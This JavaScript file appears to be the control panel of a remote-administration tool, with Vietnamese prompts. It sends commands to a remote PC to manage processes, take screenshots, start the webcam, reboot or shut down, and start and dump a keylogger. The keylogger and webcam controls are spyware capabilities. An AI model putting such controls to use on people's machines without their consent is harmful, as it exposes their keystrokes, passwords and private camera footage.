function listApp() {
    sendCommand("application list");
    appendAppLog("Requested application list");
}

function startApp() {
    const app = prompt("Nhập tên ứng dụng (vd: notepad.exe)");
    sendCommand("application start " + app);
}

function stopApp() {
    const app = prompt("Nhập PID hoặc tên process");
    if (!app) return;
    sendCommand("application stop " + app);
}

function listProc() {
    sendCommand("process list");
}

function stopProc() {
    const pid = prompt("Nhập PID");
    if (!pid) return;
    sendCommand("process stop " + pid);
}

function startKeylogger() {
    sendCommand("key start");
}

function stopKeylogger() {
    sendCommand("key stop");
}

function getKeylog() {
    sendCommand("key dump");
}

function startWebcam() {
    sendCommand("webcam start");
}

function Screenshoot() {
    sendCommand("screenshot");
}

function restart() {
    if (confirm("Sure?"))
        sendCommand("restart PC");
}

function shutdown() {
    if (confirm("Sure?"))
        sendCommand("shutdown PC");
}

let lastVideoUrl = "";

function downloadVideo() {
    if (!lastVideoUrl) {
        alert("Chưa có video để tải");
        return;
    }

    const a = document.createElement("a");
    a.href = lastVideoUrl;
    a.download = lastVideoUrl.split("/").pop();
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

